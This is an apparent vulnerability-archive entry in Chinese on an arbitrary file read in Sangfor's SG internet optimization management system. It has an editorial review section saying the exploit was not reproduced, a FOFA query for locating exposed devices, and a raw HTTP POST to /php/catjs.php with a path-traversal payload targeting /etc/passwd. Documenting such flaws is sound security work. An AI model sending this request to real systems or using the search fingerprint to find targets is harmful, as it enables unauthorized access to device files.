---
source: "wy876 漏洞文库"
id: "vw-a7982ef71386a38c1986cfa6"
entity_id: "ve-a7982ef71386a38c1986cfa6"
schema_version: "1"
title: "深信服SG上网优化管理系统catjs存在任意文件读取漏洞"
product: "Sangfor SG上网优化管理"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无会话请求，固件未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DSG%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fcatjs%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zn0vntfcl2txn765"
source_status: "recorded"
previous_fofa_unverified: "title="
fofa: "title=\"SANGFOR上网优化管理\""
---

# 深信服SG上网优化管理系统catjs存在任意文件读取漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor SG上网优化管理
- 本文讨论：php/catjs.php JSON数组路径穿越
- 版本、权限与配置前提：无会话请求，固件未给
- 资料类型：文件读取请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- JSON体但表单Content-Type，解析条件未解释；无结果/修复
- fofa字段残缺，长产品介绍不提供版本
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 请求解析与双产品命名范围待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
SANGFOR上网优化管理系统是一款集上网行为管理、网络准入、设备准入以及业务访问行为分析于一体的安全产品。核心优势：多种认证方式、全面的审计能力、支持多种应用的封堵、*的流量控制；准确识别iot设备、统一管理硬件资产；强管控违规用户，精细分析行为画像；部署实施简单，维护成本低。全网行为管理基于端点无感知、少故障节点、不影响原有网络为原则的产品设计理念，致力于给客户带来更好的使用体验。深信服SG上网优化管理系统catjs存在任意文件读取漏洞

# 二、影响版本
+ 深信服SG上网优化管理系统

# 三、资产测绘
+ fofa`title="SANGFOR上网优化管理"`
+ 特征


# 四、漏洞复现
```http
POST /php/catjs.php HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

["../../../../../../../etc/passwd"]
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zn0vntfcl2txn765>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
